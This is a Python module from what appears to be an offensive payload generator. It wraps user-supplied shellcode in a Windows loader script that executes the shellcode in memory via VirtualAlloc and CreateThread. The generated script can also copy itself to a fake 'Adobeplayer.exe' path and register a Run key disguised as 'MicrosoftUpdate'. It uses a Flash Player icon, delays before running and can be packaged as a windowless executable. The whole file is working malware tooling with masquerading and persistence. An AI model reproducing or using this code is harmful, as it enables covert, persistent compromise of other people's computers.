import os
import time
import random
import shutil
from module import Moduleobject

class exe_options(Moduleobject):
    def __init__(self,ui):
        super(exe_options,self).__init__()
        self.ui=ui
        ui.banner()
        self.values={'source':'',
                     'outfile':'%s'%(time.strftime('%m%Y')+str(random.randint(0,100))+'.exe'),
                     'icon':'./icon/flashplayer.ico',
                     'sleep':'10',
                     'persistence':False,
                     'path':r'C:\\Users\\Public\\Libraries\\Adobeplayer.exe',
                     }
        self.read_code = r''
        self.outfile_dirpath = './output/'
        self.output_script_name = ''
        # self.persistent_True_option  = self.values['path'],'persistence()',self.values['sleep']
        # self.persistent_False_option =        ''          ,'pass'         ,self.values['sleep']

    def script_code(self,arrive_path,shellcode,persistence,sleeptime):
        return ('''
import sys,time,shutil,winreg,ctypes,os
        
arrive_path = "%s"
            
def copyfile_to_C_disk():
    shutil.copy(sys.argv[0],arrive_path)
            
def edit_reg():
    Key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_WRITE)
    winreg.SetValueEx(Key,"MicrosoftUpdate",0, winreg.REG_SZ,arrive_path)
                
def persistence():
    copyfile_to_C_disk()
    edit_reg()
    
    
shellcode = ("%s")
            
            
if __name__ == "__main__":
    if os.path.isfile(arrive_path) == False:
        %s
    else:
        pass
    time.sleep(%s)
    ptr = ctypes.windll.kernel32.VirtualAlloc(0, 4096, ctypes.c_int(0x1000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),ctypes.c_int(len(shellcode)))
    byte = bytearray()
    byte.extend(map(ord,shellcode))
    buffer = (ctypes.c_char * len(shellcode)).from_buffer(byte)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buffer, ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))'''%(arrive_path,shellcode,persistence,sleeptime))

    def read_shellcode(self,filename):
        with open (filename,'r') as shellcode:
            print('\033[92m' + '[*]' + '\033[0m''------> shellcode recorded <------')
            return str(shellcode.read())

    def write_script(self,code):
        output_script_name = self.outfile_dirpath+self.values['outfile']+'.py'
        with open (output_script_name,'w') as code_write:
            if not self.values['persistence']:
                code_write.write(self.script_code(arrive_path=self.values['path'],
                                                  shellcode=code,
                                                  persistence='pass',
                                                  sleeptime=self.values['sleep']))
            else:
                code_write.write(self.script_code(arrive_path=self.values['path'],
                                                  shellcode=code,
                                                  persistence='persistence()',
                                                  sleeptime=self.values['sleep']))
        print('\033[92m' + '[*]' + '\033[0m' + 'script was created succesfully ! ! ',end='\n')
        return output_script_name

    #def generate_exe(self):
    #    if os.path.isfile(self.output_script_name):
    #        os.system("wine ~/.wine/drive_c/Python34/Scripts/pyinstaller.exe %s --onefile --noconsole --icon=%s --clean"
    #              %(self.output_script_name,self.values['icon']))
    #        print('\033[92m'+'[*]'+'\033[0m'+'exe file was created succesfully ! ! ')

    #def clean_cache(self,file):
    #    shutil.rmtree('./build')
    #    os.remove('./%s.spec'%file)
    #    shutil.copy('./dist/%s'%file,'./output/')
    #    shutil.rmtree('./dist')
    #   print('\033[92m' + '[*]' + '\033[0m' +"cache was cleaned")

    def run_action(self):
        self.read_code = self.read_shellcode(self.values['source'])
        time.sleep(2)
        self.output_script_name = self.write_script(code=self.read_code)
        time.sleep(2)
        print('-' * 50)
    #   self.generate_exe()
    #   time.sleep(2)
    #   self.clean_cache(self.values['outfile'])
        input('type any key to continue')
